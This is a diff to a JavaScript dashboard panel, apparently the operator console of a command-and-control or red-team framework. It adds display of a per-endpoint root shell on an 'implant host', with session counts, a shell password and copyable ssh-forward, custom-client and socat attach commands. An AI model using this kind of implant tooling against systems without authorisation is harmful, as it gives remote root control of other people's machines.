@@ -7218,6 +7218,7 @@ async function drawTunnel(panel){
   const srv = data.server || {};
   const rows = data.endpoints || [];
   const running = srv.state === "running";
+  const recording = rows.some(r => r.shell_recording);
   const bytes = n => n >= 1048576 ? (n/1048576).toFixed(1)+" MB"
                    : n >= 1024 ? (n/1024).toFixed(1)+" KB" : (n||0)+" B";
   // Every refusal kind that is not zero, read off the keys rather than
@@ -7230,6 +7231,57 @@ async function drawTunnel(panel){
     .map(k => esc(k.slice(8).replace(/_/g," ")) + " " + esc(String(s[k])))
     .join(", ");
 
+  // The shell half of a row. It sits beside the SOCKS half and reads like
+  // it: a port, a count of live sessions, its refusals through the same
+  // reader, and a credential. The credential is the shell port's own and
+  // is not the SOCKS one; the label says so, because the two are printed
+  // a few lines apart and a reader who pasted the wrong one would be
+  // refused with nothing to say why.
+  //
+  // The port is on the team server's loopback and the panel is routinely
+  // reached over an SSH forward, so the forward is written first and the
+  // attach command second. Each is its own line so that it can be copied
+  // whole.
+  const shellBlock = row => {
+    const shell = row.shell;
+    const port = esc(String(shell.port));
+    const refusedShell = refusals(shell);
+    const line = text => '<div style="margin-left:12px"><code>' + text
+      + '</code></div>';
+    return '<div style="font-size:12px;margin-top:6px">'
+      + '<strong>Shell</strong> <span style="color:var(--dim)">'
+      + 'team server 127.0.0.1:' + port
+      + ' &middot; ' + esc(String(shell.sessions)) + ' session(s)'
+      + (shell.max_sessions ? '/' + esc(String(shell.max_sessions)) : '')
+      + '</span></div>'
+      + '<div style="font-size:11px;color:var(--yellow,#d7ba7d)">'
+      + 'This is a root shell on the implant host. Forwarding the port to '
+      + 'your workstation extends its reach to whatever can reach that '
+      + 'workstation\'s loopback.</div>'
+      + '<div style="font-size:11px;color:var(--dim)">'
+      + 'The port is on the team server, not on your workstation. From '
+      + 'your workstation, forward it:</div>'
+      + line('ssh -L ' + port + ':127.0.0.1:' + port
+             + ' &lt;user&gt;@&lt;team-server&gt;')
+      + '<div style="font-size:11px;color:var(--dim)">then attach (this '
+      + 'client sends your terminal size, and has no escape key: end the '
+      + 'far shell to leave):</div>'
+      + line('python3 tools/raccoon_shell.py 127.0.0.1 ' + port)
+      + '<div style="font-size:11px;color:var(--dim)">Fallback if the '
+      + 'client is not to hand &mdash; socat cannot send a terminal size, '
+      + 'and Ctrl-] leaves the session:</div>'
+      + line('socat -,raw,echo=0,escape=0x1d TCP:127.0.0.1:' + port)
+      + '<div style="font-size:11px;color:var(--dim)">'
+      + 'Shell password (this port only &mdash; not the SOCKS password '
+      + 'above; enter it at the password prompt): '
+      + esc(row.shell_password) + '</div>'
+      + (shell.refused
+         ? '<div style="font-size:11px;color:var(--dim)">'
+           + esc(String(shell.refused)) + ' refused on the shell port'
+           + (refusedShell ? ' &mdash; ' + refusedShell : '')
+           + '</div>'
+         : '');
+  };
   // The two objects, named here because the panel cannot otherwise show
   // why one button is immediate and the other is not. A stop that
   // silently takes five minutes is the cousin of a start button that
@@ -7270,7 +7322,20 @@ async function drawTunnel(panel){
     + (data.managed ? '' :
        '<span style="font-size:11px;color:var(--dim);margin-left:8px">'
        + esc(String(data.detail||srv.detail||"")) + '</span>')
-    + '</div></div></div>';
+    + '</div>'
+    // `shell_recording` is the deployment's answer ("a transcript
+    // directory and a shell range are configured") and is copied onto
+    // every row, a disconnected one and one that failed to bind
+    // included. So it is shown here, once, about the server, and not
+    // beside a row that may have nothing to record: that row's own story
+    // is its `shell` and its `shell_detail`.
+    + (recording
+       ? '<div id="tunnel-recording-badge" style="font-size:11px;margin-top:6px">'
+         + '<span style="color:var(--red,#ff1a1a)">&#9679; recording</span> '
+         + '<span style="color:var(--dim)">shell sessions on this server '
+         + 'are written to a transcript</span></div>'
+       : '')
+    + '</div></div>';
 
   // ── The endpoints: one row per identity, each one a task away ──
   html += '<h3 style="font-size:13px;margin:12px 0 6px">Endpoints</h3>';
@@ -7337,6 +7402,12 @@ async function drawTunnel(panel){
            + 'SOCKS5 user/pass per RFC 1929: ' + esc(row.username)
            + ' / ' + esc(row.password) + '</div>'
          : '')
+      + (row.shell
+         ? shellBlock(row)
+         : (row.shell_detail
+            ? '<div style="font-size:11px;color:var(--dim)">shell port: '
+              + esc(row.shell_detail) + '</div>'
+            : ''))
       // Why a tunnel refused to start. The endpoint child's stderr is
       // closed, so this sentence reaches an operator here or nowhere.
       + (row.refusal
